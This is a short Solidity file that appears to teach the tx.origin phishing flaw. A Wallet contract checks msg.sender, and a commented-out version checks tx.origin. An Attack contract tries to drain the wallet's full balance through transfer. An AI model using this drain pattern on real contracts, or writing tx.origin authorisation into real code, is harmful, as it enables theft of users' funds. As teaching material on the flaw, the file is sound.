// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

contract Wallet {
    
    address public owner;

    constructor () payable {
        owner = msg.sender;
    }
    ///only owner can call this function
    error onlyowner();
    
    ///failed to send
    error failedtoSend();

    modifier  onlyOwner(){

        if(msg.sender!=owner){
            revert onlyowner();
        }
        _;
    }
//    modifier  onlyOwner(){

//         if(tx.origin!=owner){
//             revert onlyowner();
//         }
//         _;
//     }

    

    function transfer(address _to,uint _amount) public onlyOwner{

         uint amount = _amount ;
         (bool success ,) = _to.call{value:amount}("");

         if(!success){
             revert failedtoSend();
         }
 
    }


    function getContractBalance() public view returns (uint){
        return address(this).balance;
    }
}

contract Attack{

    Wallet wallet;
    address payable  public owner;

    constructor(Wallet _wallet){
        wallet = Wallet(_wallet);
        owner = payable (msg.sender);
    }

    function attack() public {
         wallet.transfer(owner, address(wallet).balance);
    }
}